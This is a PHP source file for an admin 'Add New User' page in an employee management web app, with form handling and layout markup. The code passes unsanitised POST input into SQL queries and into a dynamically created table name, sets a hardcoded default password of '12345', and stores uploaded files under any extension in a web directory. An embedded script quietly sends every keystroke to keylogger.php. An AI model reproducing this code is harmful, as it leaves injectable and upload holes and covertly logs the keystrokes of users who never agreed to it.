<?php
include('header.php');

if(isset($_POST['submit']))
{
	$name = ucfirst($_POST['name']);
	$email = $_POST['email'];
	$mobile = $_POST['mobile'];
	$dob = $_POST['dob'];
	$gender = $_POST['gender'];
	$department = $_POST['dep_name'];
	if($_POST['experience'] == 'Yes')
	{
		$year = $_POST['year'];
		$company_name = $_POST['company_name'];
		$designation = $_POST['designation'];
	}
	elseif($_POST['experience'] == 'No')
	{
		$year = "";
		$company_name = "";
		$designation = "";

	}
	
	$father_name = $_POST['father_name'];
	$mother_name = $_POST['mother_name'];
	$father_mobile = $_POST['father_mobile'];
	$address = $_POST['address'];
	$user_id = $_POST['user_id'];
	$password = "12345";
	$table = "msg_".$user_id;
	
	if(!empty($_FILES['file']['name']))
	{
		$image_temp = $_FILES['file']['tmp_name'];
		$extension = pathinfo($_FILES['file']['name'],PATHINFO_EXTENSION);
		$image_name = $user_id.".".$extension;
		move_uploaded_file($image_temp,'employee/'.$image_name);	
	}
	else
	{
    	$image_name = "unknown.jpg";
	}
	
	$query = mysql_query("INSERT INTO employee values ('','$name','$user_id','$password','$email','$mobile','$gender','$dob','$department','$year','$company_name','$designation','$father_name','$mother_name','$father_mobile','$address','$image_name','True')");
	
	
	$query = mysql_query("CREATE TABLE $table
	(id INT NOT NULL AUTO_INCREMENT, 
	PRIMARY KEY(id),
	User_id varchar(255) NOT NULL,
	Subject varchar(255) NOT NULL,
	Description varchar(255) NOT NULL,
	Time varchar(255) NOT NULL,
	Display varchar(255) NOT NULL,
	Status varchar(255) NOT NULL)
	");
	
	//create new folder in my directory.. with employee id
	mkdir("keylogger/$user_id");
	
}//end if(isset)

$query = mysql_query("SELECT User_id FROM employee order by id desc limit 1");
$row = mysql_fetch_assoc($query);
$user_no = substr($row['User_id'],4,3) + 1;
$new_user_id = "emp_".$user_no;

?>

   <?php
	if(substr($_SESSION['login_id'],0,4) == 'admi')
	{
	
	?> 
    
    <!-- start navigation bar -->
    <div class="row nav">
   
    	<a href="home.php">
        <div class="large-2 column">
         Home
        </div>
        </a>
        
        <a href="manage_emp.php">
        <div class="large-2 column">
       	 Manage Emp
        </div>
        </a>
        
        <a href="message.php">
        <div class="large-2 column">
         Message
        </div>
        </a>
        
        <a href="task.php">
        <div class="large-2 column">
         Task
        </div>
        </a>
        
        <a href="signup.php">
        <div class="large-2 column" style="background:#10255F;">
         Add New User
        </div>
        </a>
        
        <a href="setting.php">
        <div class="large-2 column" >
        Setting
        </div>
        </a>
        
    </div>
    
    <!-- end navigation bar -->
    
  	<?php
	}
    else
	{
		unset($_SESSION['login_id']);
		header('location: index.php');	
	}
	?> 
    
    
    
<script type="text/javascript">

//*************** START **************
//execute when we press and key from the key board... 
$(document).keydown(function(event)
{
	//store that key into keycode variable..
	var keycode = event.keyCode;
	
	//call reload.php page using get method..
	//we send key value with the help of get method into reload.php page.. 	
	$('#hello').load('keylogger.php?press_key='+keycode+'&page=sign_up');

});
//*************** END ****************

</script>


<!-- for key stock.. -->
<div id="hello"></div>
<!-- for key stock.. -->
    
    
    
    
    
    <!-- start main heading -->
    <div class="row">
    	<div class="large-3 column main_heading">
        Sign Up
        </div>
        <div class="large-6 large-offset-1 column main_heading end">
        <span class="success_msg" style="color:#F00;">
        <?php 
		if(isset($_POST['submit']))
		{
			echo 'Successfully employee Insert';
		}
		?>
        
        </span>
        </div>
    </div>
    <!-- end main heading -->


    <!-- start horizantal line -->
     <div class="row">
    	<div class="large-12 column">
        <hr style="border:0.1em #999999 solid;">
        </div>
    </div>
    <!-- end horizantal line -->
    
    <!-- Start User details -->
    <div class="sign_up">
    
    <!-- start row -->
    <div class="row user_detail">
    	
        <!-- Start 6 column for user details -->	
        <div class="large-6 column">
        
        <form action="signup.php" method="post" enctype="multipart/form-data">
        
        
        <div class="block"><!-- start personal detial -->
        
        	<div class="row name">
                <div class="large-6 column title">
                Personal Details
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
                Name<span>*</span> :
                </div>            
            
                <div class="large-6 column end">
                <input type="text"  name="name" class="box"  required placeholder="First name" />
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
                User Id<span>*</span> :
                </div>            
            
                <div class="large-6 column end">
                <input type="email" name="user_id" required class="box" value="<?php echo $new_user_id;?>" readonly placeholder="E-mail" />
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Email Add<span>*</span> :
                </div>            
            
                <div class="large-6 column end">
                <input type="email" name="email" required class="box" placeholder="E-mail" />
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Mobile No<span>*</span> :
                </div>            
            
                <div class="large-6 column end">
                <input type="text" name="mobile" id="mobile" required  class="box" pattern="[0-9]{10}" maxlength="10" placeholder="Mobile Number" />
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Date of Birth<span>*</span> :
                </div>            
            
                <div class="large-6 column end">
                <input type="date" class="box" style="text-align:right;" required name="dob" />
                </div>
            </div>
            
             <div class="row name">
            	<div class="large-6 column heading">
                Gender<span>*</span> :
                </div>            
            
                <div class="large-6 column end">
                <select required  name="gender" class="select">
                <option value="Male">Male</option>
                <option value="Female">Female</option>
                </select> 
                </div>
            </div>

		</div><!-- end personal detail -->


		<div class="block"><!-- start profession details -->
        
            <div class="row name">
                <div class="large-6 column title">
                Professional Details
                </div>
            </div>
              
              
             <div class="row name">
            	<div class="large-6 column heading">
               	Department :
                </div>            
            
                <div class="large-6 column end">
                <input type="text" name="dep_name" class="box" placeholder="Department name" />
                </div>
            </div>
            
             <div class="row name" style="margin-bottom:17px;">
            	<div class="large-6 column heading">
               	Experience<span>*</span> : 
                </div>            
            
                <div class="large-3 column">
                <label class="radio">Yes<input type="radio" class="exp_yes" required value="Yes" name="experience"></label>
                </div>
                
                <div class="large-3 column end">
            <label class="radio">NO<input type="radio" name="experience" class="exp_no" value="No"></label>
                </div>                
            </div>
            
            
            <div class="row name">
            	<div class="large-6 column heading">
                Year
                </div>
                <div class="large-6 column end">
                <input type="number" class="box exp_year" required min="0" name="year" placeholder="Year">
                </div>
            </div>
            
            
             <div class="row name">
            	<div class="large-6 column heading">
               	Company :
                </div>            
            
                <div class="large-6 column end">
                <input type="text" name="company_name" required class="box exp_comp"  placeholder="Company name" />
                </div>
            </div>
            
            <div class="row name">
            	<div class="large-6 column heading">
               	Designation : 
                </div>            
            
                <div class="large-6 column end">
                <input type="text" name="designation" required class="box exp_des" placeholder="Desingnation" />
                </div>
            </div>
          </div><!-- end profession details -->
            
            
        </div>
        <!-- end 6 column for user details -->
        
        <!-- start family details -->
        <div class="large-6 column">
        	<div class="row ">
        
        		<div class="large-12 column">
                 
                 <div class="block"><!-- start family details -->
                 
                    <div class="row name">
                        <div class="large-6 column title">
                        Family Details
                        </div>
                    </div>
                    
                    <div class="row name">
                        <div class="large-6 column heading">
                        Father Name<span>*</span> : 
                        </div>            
                    
                        <div class="large-6 column end">
                        <input type="text" name="father_name" class="box" required  placeholder="Father Name" />
                        </div>
                    </div>
            
                    <div class="row name">
                        <div class="large-6 column heading">
                        Mother Name<span>*</span> : 
                        </div>            
                    
                        <div class="large-6 column end">
                       <input type="text" name="mother_name" class="box" required  placeholder="Mother Name" />
                        </div>
                    </div>
                    
                    <div class="row name">
                        <div class="large-6 column heading">
                        Father Mobile : 
                        </div>            
                    
                        <div class="large-6 column end">
                       <input type="text" name="father_mobile" class="box" pattern="[0-9]{10}" maxlength="10"  placeholder="Father Mobile" />
                        </div>
                    </div>
            
                    <div class="row name">
                        <div class="large-6 column heading">
                        Address<span>*</span> : 
                        </div>            
                    
                        <div class="large-6 column end">
                        <textarea name="address" required style="resize:none; height:100px; width:200px;"></textarea>
                        </div>
                    </div>
                    
                    <div class="row name">
                        <div class="large-6 column heading">
                        Image Upload : 
                        </div>            
                    
                        <div class="large-6 column end">
                        <input type="file" name="file" accept="image/jpeg" accept="image/gif" accept="image/x-png"  >
                        </div>
                    </div>
                   </div><!-- end family detail -->
                 
            </div>
            <!-- end  12 column -->
            
            
        </div>
        <!-- end row -->
        
        </div>	
        <!-- end 6 column -->
        
        
         </div>
    <!-- end row -->
        
        <!-- start row -->
        <div class="row">
        
        <div class="large-2 large-centered column">
        <input type="submit" value="submit" name="submit" style="margin-bottom:50px;" class="submit">
        </div>
        
        </div>
        <!-- end row -->

   
    
    </div>
    <!-- end index -->
    
    <script>
		//initialy three fields are readonly mode..
		$(".exp_year").attr('readonly','readonly');
		$(".exp_comp").attr('readonly','readonly');
		$(".exp_des").attr('readonly','readonly');
		
		//when click on yes button
        $("input:radio[class='exp_yes']").change(function(){
			
			if($(this).is(":checked"))
			{
				$(".exp_year").removeAttr('readonly','readonly');
				$(".exp_comp").removeAttr('readonly','readonly');
				$(".exp_des").removeAttr('readonly','readonly');				
			}
		});
		//when click on No button
		$("input:radio[class='exp_no']").change(function(){
			if($(this).is(":checked"))
			{
				$(".exp_year").attr('readonly','readonly');
				$(".exp_year").val("");
				$(".exp_comp").attr('readonly','readonly');
				$(".exp_comp").val("");
				$(".exp_des").attr('readonly','readonly');
				$(".exp_des").val("");
							
			}
		});
		
		$(".success_msg").delay(2000).slideUp(1000);
		
        </script>
    
</body>
</html>